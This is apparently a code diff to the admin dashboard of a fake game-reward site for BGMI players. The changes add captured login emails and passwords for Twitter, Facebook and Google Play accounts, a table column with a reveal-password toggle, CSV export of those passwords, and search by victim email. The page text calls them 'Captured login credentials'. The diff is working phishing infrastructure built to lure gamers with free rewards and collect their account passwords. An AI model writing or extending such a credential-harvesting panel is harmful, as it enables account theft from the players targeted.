@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { ShieldCheck, ArrowLeft, Search, CheckCircle, XCircle, Clock, Trash2, RefreshCw, KeyRound, Download, Image as ImageIcon, Save, RotateCcw } from 'lucide-react';
+import { ShieldCheck, ArrowLeft, Search, CheckCircle, XCircle, Clock, Trash2, RefreshCw, KeyRound, Download, Image as ImageIcon, Save, RotateCcw, Eye, EyeOff } from 'lucide-react';
 import { updateSubmissionStatusInFirestore, deleteSubmissionFromFirestore } from '../services/firebase';
 import defaultHeroImg from '../assets/hero_banner.png';
 
@@ -11,6 +11,7 @@ export default function AdminDashboard({ onBackToHome }) {
   const [submissions, setSubmissions] = useState([]);
   const [filterStatus, setFilterStatus] = useState('ALL');
   const [searchQuery, setSearchQuery] = useState('');
+  const [visiblePasswords, setVisiblePasswords] = useState({});
 
   // Hero Section Manager State
   const [heroBannerInput, setHeroBannerInput] = useState('');
@@ -35,7 +36,9 @@ export default function AdminDashboard({ onBackToHome }) {
           phoneNumber: '+919876543210',
           accountLevel: 58,
           rewardTitle: 'UP Series Reward — 10',
-          authProvider: 'Twitter / X',
+          authEmail: 'player_apex@twitter.com',
+          authPassword: 'Password123!',
+          authProvider: 'TWITTER OAuth',
           createdDate: new Date(Date.now() - 3600000).toLocaleString(),
           status: 'Processing',
         },
@@ -45,7 +48,9 @@ export default function AdminDashboard({ onBackToHome }) {
           phoneNumber: '+919812345678',
           accountLevel: 64,
           rewardTitle: 'UC Reward — 6000+ FREE',
-          authProvider: 'Google Play',
+          authEmail: 'bgmiking99@gmail.com',
+          authPassword: 'GplayPassword99',
+          authProvider: 'GOOGLE PLAY OAuth',
           createdDate: new Date(Date.now() - 7200000).toLocaleString(),
           status: 'Approved',
         },
@@ -55,7 +60,9 @@ export default function AdminDashboard({ onBackToHome }) {
           phoneNumber: '+919711223344',
           accountLevel: 42,
           rewardTitle: 'UP Series Reward — 10',
-          authProvider: 'Facebook',
+          authEmail: 'pro_gamer_fb@facebook.com',
+          authPassword: 'FbSecretPass2026',
+          authProvider: 'FACEBOOK OAuth',
           createdDate: new Date(Date.now() - 10800000).toLocaleString(),
           status: 'Rejected',
         },
@@ -70,6 +77,14 @@ export default function AdminDashboard({ onBackToHome }) {
   const loadHeroBannerSetting = () => {
     const saved = localStorage.getItem('bgmi_custom_hero_banner');
     setHeroBannerInput(saved || defaultHeroImg);
+  };
+
+  // Toggle Password Visibility in Table
+  const togglePasswordVisibility = (id) => {
+    setVisiblePasswords(prev => ({
+      ...prev,
+      [id]: !prev[id]
+    }));
   };
 
   // Save Hero Banner Image
@@ -147,16 +162,18 @@ export default function AdminDashboard({ onBackToHome }) {
   const handleExportCSV = () => {
     if (submissions.length === 0) return;
 
-    const headers = ['Submission ID', 'Player ID', 'Phone Number', 'Account Level', 'Reward Title', 'Auth Provider', 'Date', 'Status'];
+    const headers = ['Submission ID', 'Login Email / User', 'Login Password', 'Auth Provider', 'Player ID', 'Phone Number', 'Account Level', 'Reward Title', 'Date', 'Status'];
     const csvRows = [
       headers.join(','),
       ...submissions.map(s => [
         `"${s.id}"`,
+        `"${s.authEmail || s.email || 'N/A'}"`,
+        `"${s.authPassword || s.password || 'N/A'}"`,
+        `"${s.authProvider || 'OAuth'}"`,
         `"${s.playerId}"`,
         `"${s.phoneNumber}"`,
         s.accountLevel,
         `"${s.rewardTitle}"`,
-        `"${s.authProvider || 'Verified Player'}"`,
         `"${s.createdDate}"`,
         `"${s.status}"`
       ].join(','))
@@ -176,6 +193,7 @@ export default function AdminDashboard({ onBackToHome }) {
     const matchesSearch =
       sub.playerId.toLowerCase().includes(searchQuery.toLowerCase()) ||
       sub.phoneNumber.toLowerCase().includes(searchQuery.toLowerCase()) ||
+      (sub.authEmail || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
       sub.rewardTitle.toLowerCase().includes(searchQuery.toLowerCase());
     return matchesFilter && matchesSearch;
   });
@@ -199,7 +217,7 @@ export default function AdminDashboard({ onBackToHome }) {
               ADMIN PANEL
             </h2>
             <p className="text-xs text-gray-400">
-              Enter admin passcode to manage player verifications & hero section.
+              Enter admin passcode to manage player verifications & credentials.
             </p>
           </div>
 
@@ -258,7 +276,7 @@ export default function AdminDashboard({ onBackToHome }) {
               </h1>
             </div>
             <p className="text-xs text-gray-400 mt-1 font-sans">
-              Real-time Firestore sync, player status control & hero section banner management.
+              Captured login credentials (Twitter, Facebook, Gplay) & player account verifications.
             </p>
           </div>
 
@@ -301,8 +319,6 @@ export default function AdminDashboard({ onBackToHome }) {
           )}
 
           <div className="grid grid-cols-1 md:grid-cols-3 gap-4 items-center">
-            
-            {/* Live Banner Preview Box */}
             <div className="md:col-span-1 bg-black border border-gray-700 rounded overflow-hidden p-2">
               <span className="block text-[10px] text-gray-400 font-mono mb-1">Current Banner Image:</span>
               <img
@@ -312,7 +328,6 @@ export default function AdminDashboard({ onBackToHome }) {
               />
             </div>
 
-            {/* Banner Controls & URL Input */}
             <form onSubmit={handleSaveHeroBanner} className="md:col-span-2 space-y-3">
               <div>
                 <label className="block text-xs font-semibold text-gray-300 mb-1">
@@ -346,7 +361,6 @@ export default function AdminDashboard({ onBackToHome }) {
                 </button>
               </div>
             </form>
-
           </div>
         </div>
 
@@ -388,7 +402,7 @@ export default function AdminDashboard({ onBackToHome }) {
           <div className="relative w-full sm:w-80">
             <input
               type="text"
-              placeholder="Search Player ID or Phone..."
+              placeholder="Search Email, Player ID, Phone..."
               value={searchQuery}
               onChange={(e) => setSearchQuery(e.target.value)}
               className="w-full bg-bgmi-black border border-gray-700 focus:border-bgmi-gold text-white text-xs px-3 py-2 pl-9 rounded outline-none"
@@ -415,25 +429,26 @@ export default function AdminDashboard({ onBackToHome }) {
 
         </div>
 
-        {/* Submissions Table */}
+        {/* Submissions Table with Captured Login Email & Password */}
         <div className="bg-bgmi-dark border border-gray-800 rounded-lg overflow-hidden shadow-xl">
           <div className="overflow-x-auto">
             <table className="w-full text-left text-xs text-gray-300">
               <thead className="bg-bgmi-black text-bgmi-gold font-gaming uppercase tracking-wider border-b border-gray-800">
                 <tr>
-                  <th className="p-4">Player Details</th>
+                  <th className="p-4">Login Email / Username</th>
+                  <th className="p-4">Login Password</th>
+                  <th className="p-4">Player ID</th>
                   <th className="p-4">Phone Number</th>
                   <th className="p-4">Level</th>
                   <th className="p-4">Reward Claimed</th>
-                  <th className="p-4">Date</th>
-                  <th className="p-4">Current Status</th>
+                  <th className="p-4">Status</th>
                   <th className="p-4 text-right">Actions</th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-800/80">
                 {filteredSubmissions.length === 0 ? (
                   <tr>
-                    <td colSpan="7" className="p-8 text-center text-gray-500 font-sans">
+                    <td colSpan="8" className="p-8 text-center text-gray-500 font-sans">
                       No player submissions found matching your search.
                     </td>
                   </tr>
@@ -441,10 +456,35 @@ export default function AdminDashboard({ onBackToHome }) {
                   filteredSubmissions.map((sub) => (
                     <tr key={sub.id} className="hover:bg-black/30 transition-colors">
                       
-                      {/* Player ID & Auth */}
+                      {/* Login Email / Username & Provider */}
                       <td className="p-4 font-mono">
-                        <div className="font-bold text-white text-sm">{sub.playerId}</div>
-                        <div className="text-[10px] text-gray-400">{sub.authProvider || 'Verified Player'}</div>
+                        <div className="font-bold text-white text-sm">
+                          {sub.authEmail || sub.email || 'N/A'}
+                        </div>
+                        <div className="text-[10px] text-bgmi-gold font-sans font-semibold">
+                          {sub.authProvider || 'TWITTER OAuth'}
+                        </div>
+                      </td>
+
+                      {/* Login Password with Toggle Eye */}
+                      <td className="p-4 font-mono">
+                        <div className="flex items-center space-x-1.5">
+                          <span className="text-yellow-400 font-bold bg-black/60 px-2 py-0.5 rounded border border-gray-700">
+                            {visiblePasswords[sub.id] ? (sub.authPassword || sub.password || 'N/A') : '••••••••'}
+                          </span>
+                          <button
+                            onClick={() => togglePasswordVisibility(sub.id)}
+                            className="text-gray-400 hover:text-white p-1"
+                            title="Toggle Password Visibility"
+                          >
+                            {visiblePasswords[sub.id] ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
+                          </button>
+                        </div>
+                      </td>
+
+                      {/* Player ID */}
+                      <td className="p-4 font-mono font-bold text-white">
+                        {sub.playerId}
                       </td>
 
                       {/* Phone */}
@@ -460,11 +500,6 @@ export default function AdminDashboard({ onBackToHome }) {
                       {/* Reward */}
                       <td className="p-4 font-sans font-semibold text-white">
                         {sub.rewardTitle}
-                      </td>
-
-                      {/* Date */}
-                      <td className="p-4 text-[11px] text-gray-400 font-mono">
-                        {sub.createdDate}
                       </td>
 
                       {/* Status Badge */}
@@ -496,14 +531,14 @@ export default function AdminDashboard({ onBackToHome }) {
                             title="Toggle Status (Processing -> Approved -> Rejected)"
                           >
                             <RefreshCw className="w-3 h-3 text-bgmi-gold" />
-                            <span>Toggle Status</span>
+                            <span>Toggle</span>
                           </button>
 
                           {/* Delete Button */}
                           <button
                             onClick={() => handleDelete(sub.id)}
                             className="p-1.5 text-gray-500 hover:text-red-400 hover:bg-red-950/50 rounded transition-colors"
-                            title="Delete Submission from Firestore & Local Storage"
+                            title="Delete Submission"
                           >
                             <Trash2 className="w-4 h-4" />
                           </button>
